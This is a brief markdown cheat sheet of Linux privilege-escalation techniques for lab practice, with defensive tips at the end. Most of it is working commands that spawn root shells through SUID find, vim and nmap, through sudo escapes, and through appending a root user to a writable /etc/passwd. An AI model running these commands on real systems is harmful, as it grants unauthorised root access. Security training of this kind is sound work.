# Privilege Escalation Exploitation Examples

## Common SUID Binary Exploits

### Example 1: SUID Find Binary

If `find` has SUID bit set:
```bash
find . -exec /bin/bash -p \;
```

### Example 2: SUID Vim Binary

If `vim` has SUID bit set:
```bash
vim -c ':!/bin/bash'
```

### Example 3: SUID Nmap (older versions)

```bash
nmap --interactive
nmap> !sh
```

### Example 4: Writable /etc/passwd

If /etc/passwd is writable:
```bash
# Generate password hash
openssl passwd -1 -salt xyz password123

# Add new root user
echo 'newroot:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to new user
su newroot
```

### Example 5: Sudo Misconfiguration

If user can run specific commands as root:
```bash
# Check sudo permissions
sudo -l

# Common exploits
sudo vim  # then :!/bin/bash
sudo find . -exec /bin/bash \;
sudo awk 'BEGIN {system("/bin/bash")}'
```

## Lab Setup Recommendations

1. Use vulnerable VMs:
   - HackTheBox
   - TryHackMe
   - VulnHub machines

2. Practice on intentionally vulnerable systems only

## Detection & Mitigation

- Regularly audit SUID binaries
- Principle of least privilege
- Monitor /etc/passwd and /etc/shadow changes
- Use tools like LinPEAS or LinEnum
